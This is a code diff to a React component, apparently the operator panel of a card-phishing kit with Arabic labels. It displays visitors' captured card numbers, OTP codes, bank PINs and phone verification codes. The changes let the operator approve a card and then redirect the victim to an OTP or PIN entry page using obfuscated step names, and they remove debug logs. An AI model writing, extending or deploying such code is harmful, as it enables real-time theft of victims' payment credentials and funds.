@@ -342,7 +342,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
     if (cardNumber || directCardNumber || encryptedCardNumber) {
       bubbles.push({
-        id: `card-info-${cardHistory.id || index}`,
+        id: cardHistory.id || `card-history-${index}`,
         title:
           isLatestCard
             ? "معلومات البطاقة"
@@ -391,7 +391,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
     if (otp) {
       bubbles.push({
-        id: `otp-${otpHistory.id || index}`,
+        id: otpHistory.id || `otp-history-${index}`,
         title:
           isLatestOtp
             ? "كود OTP"
@@ -440,7 +440,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
     if (pinCode) {
       bubbles.push({
-        id: `pin-${pinHistory.id || index}`,
+        id: pinHistory.id || `pin-history-${index}`,
         title:
           isLatestPin
             ? "رمز PIN"
@@ -504,7 +504,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
     if (phoneOtp) {
       bubbles.push({
-        id: `phone-otp-${phoneOtpHistory.id || index}`,
+        id: phoneOtpHistory.id || `phone-otp-history-${index}`,
         title:
           index === 0
             ? "كود تحقق الهاتف"
@@ -703,25 +703,20 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       switch (bubble.type) {
         case "card":
           if (action === "otp") {
-            // Approve card with OTP - update history status
-            console.log(
-              "[Action] Card OTP clicked, bubble.id:",
-              bubble.id,
-              "history:",
-              visitor.history
-            );
             await updateHistoryStatus(
               visitor.id,
               bubble.id,
               "approved_with_otp",
               visitor.history || []
             );
-            console.log("[Action] Status updated to approved_with_otp");
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_otp",
+              otpStatus: "show_otp",
+              _v5Status: "pending",
+              redirectPage: "otp",
+              currentStep: "_t2",
             });
           } else if (action === "pin") {
-            // Approve card with PIN - update history status
             await updateHistoryStatus(
               visitor.id,
               bubble.id,
@@ -730,6 +725,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             );
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_pin",
+              otpStatus: "show_pin",
+              pinStatus: "waiting",
+              redirectPage: "pin",
+              currentStep: "_t3",
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
